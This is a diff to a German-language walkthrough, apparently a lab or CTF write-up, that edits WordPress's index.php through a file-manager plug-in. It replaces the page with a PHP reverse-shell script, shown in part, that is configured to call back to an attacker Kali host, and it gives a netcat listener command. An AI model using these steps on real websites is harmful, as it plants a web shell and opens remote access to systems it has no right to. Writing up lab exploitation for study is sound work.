@@ -161,13 +161,14 @@ Wenn man das Plug-in jetzt aktiviert hat kann man im Management-panel die Dateie
 
 Um jetzt das File zu verändern ums man auf das zuverändernde File rechtsklick drücken und dann kann man auf edit File -> Text area, das File ändern. 
 
-Um eine reverse shell verbindung herzustellen wollen wir diesen code in die index.php seite einfügen
+Um eine reverse shell verbindung herzustellen wollen wir diesen code in die index.php seite einfügen. Den Code in index.php wollen wir jetzt mit dem schadhaften code austauschen, der die reverse shell ermöglicht. Diesen Code finden wir unter **/usr/share/webshells/php/php-reverse-shell.php**: 
+
 ```
 [...]
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 8080;       // CHANGE THIS
+$ip = '192.168.144.206';  // Hier die Ip addresse der Kali Maschine eingeben
+$port = 1234;       // Hier den Port des für rlwrap angeben
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -176,3 +177,7 @@ $daemon = 0;
 $debug = 0;
 [...]
 ```
+
+Wenn man die Index.php nun ausgetauscht hat kann man jetzt mit dem Command `sudo rlwrap nc -lvnp 1234`. Nachdem der Befehl ausgeführt wurde sollte sich eine shell öffnen. 
+![image](./IMAGES/wp_rlwrap.png)
+
